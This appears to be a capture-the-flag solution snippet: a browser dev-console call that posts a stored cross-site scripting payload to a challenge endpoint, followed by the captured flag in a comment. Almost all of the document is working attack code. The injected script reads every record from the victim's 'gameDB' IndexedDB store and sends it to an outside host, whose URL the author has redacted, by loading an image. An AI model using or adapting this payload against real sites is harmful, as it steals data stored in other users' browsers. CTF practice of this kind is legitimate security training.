// Ran in dev console

post("./winnerwinnerchickendinner/", {"username":"123", "message":`<script>
const pls = indexedDB.open('gameDB', 1);
pls.onsuccess = function (e) {
    let db = e.target.result;
    let dsa = db.transaction('moveStore').objectStore('moveStore').getAll()
    dsa.onsuccess = function(e) {
        let asd = document.createElement('img'); asd.src = 'https://<I don't leave my urls in ctf writeups :)>.com/' + e.target.result; document.body.append(asd);
    }
};</script>`})


// RS{youtu.be/VkbcwLzB7TQ}
